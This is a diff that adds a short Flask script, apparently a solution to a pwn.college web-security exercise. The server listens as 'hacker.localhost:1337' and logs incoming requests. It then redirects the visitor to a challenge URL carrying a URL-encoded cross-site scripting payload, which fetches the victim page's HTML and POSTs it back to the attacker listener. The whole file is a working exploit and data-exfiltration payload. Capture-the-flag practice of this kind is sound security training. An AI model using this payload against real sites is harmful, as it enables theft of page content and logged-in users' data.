@@ -1,0 +1,20 @@
+#!/opt/pwn.college/python
+
+import flask
+import os
+import requests
+
+app = flask.Flask(__name__)
+
+
+@app.route("/", methods=["GET", "POST"])
+def challenge():	
+	if flask.request.method == "POST":
+		print(flask.request.form)
+		print(flask.request.method)
+		print(flask.request.headers.get("Content-Type"))
+		print(flask.request.get_data(as_text=True))
+	print(flask.request.url)
+	return flask.redirect('http://challenge.localhost/ephemeral?msg=}%3Cscript%3Efetch(new%20Request(`http://challenge.localhost/`)).then((r)=%3Er.text().then(html%20=%3E%20{fetch(new%20Request(`http://hacker.localhost:1337/`,{method:%27POST%27,body:html}))}))%3C/script%3E%27%27')
+
+app.run("hacker.localhost", 1337, debug=True)
